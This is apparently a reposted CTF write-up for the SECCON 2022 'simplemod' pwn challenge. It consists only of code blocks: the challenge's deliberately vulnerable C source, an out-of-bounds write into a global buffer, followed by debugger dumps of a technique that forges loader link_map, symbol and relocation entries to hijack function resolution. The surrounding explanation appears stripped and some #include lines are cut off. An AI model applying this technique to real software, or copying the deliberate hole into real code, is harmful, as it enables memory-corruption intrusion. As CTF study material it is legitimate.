# seccon 2022 quals – pwn simplemod by gallileo

> 原文: https://www.ctfiot.com/78936.html
> ID: 78936


```
    #include <stdio.h>
    #include <stdlib.h>
    #include 

int getint(void);
void modify(void);
__attribute__((noreturn)) void exit_imm(int status);

__attribute__((constructor))
static int init(){
	alarm(30);
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);
	return 0;
}

__attribute__((destructor))
static void fini(){
	exit_imm(0);
}

static int menu(void){
	puts("\nMENU\n"
 "1. Modify\n"
 "0. Exit\n"
 "> ");

	return getint();
}

int main(void){
	puts("You can operate 30 times.");
	for(int i=0; i<30; i++){
 switch(menu()){
 case 0:
 goto end;
 case 1:
 modify();
 puts("Done.");
 break;
 }
	}

end:
	puts("Bye.");
	return 0;
}
    #include <stdio.h>
    #include <stdlib.h>
    #include <stdint.h>
    #include 

    #define write_str(s) write(STDOUT_FILENO, s, sizeof(s)-1)

char gbuf[0x100];

static int getnline(char *buf, int size){
	int len;

	if(size <= 0 || (len = read(STDIN_FILENO, buf, size-1)) <= 0)
 return -1;

	if(buf[len-1]=='\n')
 len--;
	buf[len] = '\0';

	return len;
}

int getint(void){
	char buf[0x10] = {0};

	getnline(buf, sizeof(buf));
	return atoi(buf);
}

void modify(void){
	uint64_t ofs;

	write_str("offset: ");
	if((ofs = getint()) > 0x2000)
 return;

	write_str("value: ");
	gbuf[ofs] = getint();
}

__attribute__((naked))
void exit_imm(int status){
	asm(
 "xor rax, rax\n"
 "mov al, 0x3c\n"
 "syscall"
 );
	__builtin_unreachable();
}
fini:
 endbr64
 push rbp
 mov rbp, rsp
 mov edi, 0
 call _exit_imm

menu:
 endbr64
 push rbp
 mov rbp, rsp
 lea rdi, s ; "\nMENU\n1. Modify\n0. Exit\n> "
 call _puts
 call _getint
 pop rbp
 retn
gef➤ vmmap
[ Legend: Code | Heap | Stack ]
Start End Offset Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /home/vagrant/CTF/seccon/simplemod/chall
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /home/vagrant/CTF/seccon/simplemod/chall
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /home/vagrant/CTF/seccon/simplemod/chall
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /home/vagrant/CTF/seccon/simplemod/chall
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /home/vagrant/CTF/seccon/simplemod/chall
0x00007ffff7d8b000 0x00007ffff7d8e000 0x0000000000000000 rw-
0x00007ffff7d8e000 0x00007ffff7db6000 0x0000000000000000 r-- /home/vagrant/CTF/seccon/simplemod/libc.so.6
0x00007ffff7db6000 0x00007ffff7f4b000 0x0000000000028000 r-x /home/vagrant/CTF/seccon/simplemod/libc.so.6
0x00007ffff7f4b000 0x00007ffff7fa3000 0x00000000001bd000 r-- /home/vagrant/CTF/seccon/simplemod/libc.so.6
0x00007ffff7fa3000 0x00007ffff7fa7000 0x0000000000214000 r-- /home/vagrant/CTF/seccon/simplemod/libc.so.6
0x00007ffff7fa7000 0x00007ffff7fa9000 0x0000000000218000 rw- /home/vagrant/CTF/seccon/simplemod/libc.so.6
0x00007ffff7fa9000 0x00007ffff7fb6000 0x0000000000000000 rw-
0x00007ffff7fb6000 0x00007ffff7fb7000 0x0000000000000000 r-- /home/vagrant/CTF/seccon/simplemod/libmod.so
0x00007ffff7fb7000 0x00007ffff7fb8000 0x0000000000001000 r-x /home/vagrant/CTF/seccon/simplemod/libmod.so
0x00007ffff7fb8000 0x00007ffff7fb9000 0x0000000000002000 r-- /home/vagrant/CTF/seccon/simplemod/libmod.so
0x00007ffff7fb9000 0x00007ffff7fba000 0x0000000000002000 r-- /home/vagrant/CTF/seccon/simplemod/libmod.so
0x00007ffff7fba000 0x00007ffff7fbb000 0x0000000000003000 rw- /home/vagrant/CTF/seccon/simplemod/libmod.so # data section
0x00007ffff7fbb000 0x00007ffff7fbd000 0x0000000000000000 rw- # could likely overwrite into here
0x00007ffff7fbd000 0x00007ffff7fc1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fc1000 0x00007ffff7fc3000 0x0000000000000000 r-x [vdso]
0x00007ffff7fc3000 0x00007ffff7fc5000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7fc5000 0x00007ffff7fef000 0x0000000000002000 r-x /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7fef000 0x00007ffff7ffa000 0x000000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7ffb000 0x00007ffff7ffd000 0x0000000000037000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000039000 rw- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]
gef➤ set *(char [0x2001]*)0x00007ffff7fba0c0 = "AAAAA...A"
gef➤ p *l
$2 = {
 l_addr = 0x4141414141414141,
 l_name = 0x4141414141414141 <error: Cannot access memory at address 0x4141414141414141>,
 l_ld = 0x4141414141414141,
// ...
 l_relro_size = 0x4141414141414141,
 l_serial = 0x4141414141414141
}
gef➤
Elf64_Rela {
 r_offset = 0x4038,
 r_info = ELF64_R_INFO(6, ELF_MACHINE_JMP_SLOT),
 r_addend = 0
}
Elf64_Sym {
 st_name = 0x66,
 st_info = ELF64_ST_INFO(STB_GLOBAL, STT_FUNC),
 st_other = 0,
 st_shndx = 0,
 st_value = 0,
 st_size = 0,
}
Elf64_Sym {
 st_name = 0x4f60,
 st_info = ELF64_ST_INFO(STB_GLOBAL, STT_FUNC),
 st_other = 0,
 st_shndx = 0xf,
 st_value = 0x43640,
 st_size = 0x19,
}
typedef struct
{
 Elf64_Sxword	d_tag; /* Dynamic entry type */
 union
 {
 Elf64_Xword d_val; /* Integer value */
 Elf64_Addr d_ptr; /* Address value */
 } d_un;
} Elf64_Dyn;
// before overwrite
0x7ffff7fb9e98: Elf64_Dyn { d_tag = 5, d_un = 0x7ffff7fb6460 }
0x7ffff7fb9ea8: Elf64_Dyn { d_tag = 6, d_un = 0x7ffff7fb6328 }
// ...
0x7ffff7fbb220: link_map {
 // ...
 l_info[5] = 0x7ffff7fb9e98,
 l_info[6] = 0x7ffff7fb9ea8,
 // ...
0x7ffff7fbb330:
 l_info[26] = 0x7ffff7fb9e68,
 l_info[27] = 0x7ffff7fb9e58,
 // ...
}

// after overwrite
0x7ffff7fbb220: link_map {
 // ...
 l_info[5] = 0x7ffff7fbb330,
 l_info[6] = 0x7ffff7fbb330,
 // ...
0x7ffff7fbb330: Elf64_Dyn { d_tag = 0x7ffff7fb9e68, d_un = 0x7ffff7fba098 } // interpretation of two entries below
 l_info[26] = 0x7ffff7fb9e68,
 l_info[27] = 0x7ffff7fba098,
 // ...
}
Elf64_Sym {
 st_name = 0, // useful, since this means we need to call modify less often
 st_info = ELF64_ST_INFO(STB_GLOBAL, STT_FUNC),
 st_other = 0,
 st_shndx = 0xe,
 st_value = 0x1054, // whatever we want to call, this specific one will be explained later
 st_size = 0,
}
Elf64_Rela {
 r_offset = 0x4038, // explained later why this is necessary
 r_info = ELF64_R_INFO(11, ELF_MACHINE_JMP_SLOT), // the symbol index here was necessary, since I ran out of bytes to write and this happens to point to something that can be interpreted as a valid symbol :)
 r_addend = 0,
}
Elf64_Sym {
 st_name = 0x1080,
 // ... some other values, we don't actually care
}
```
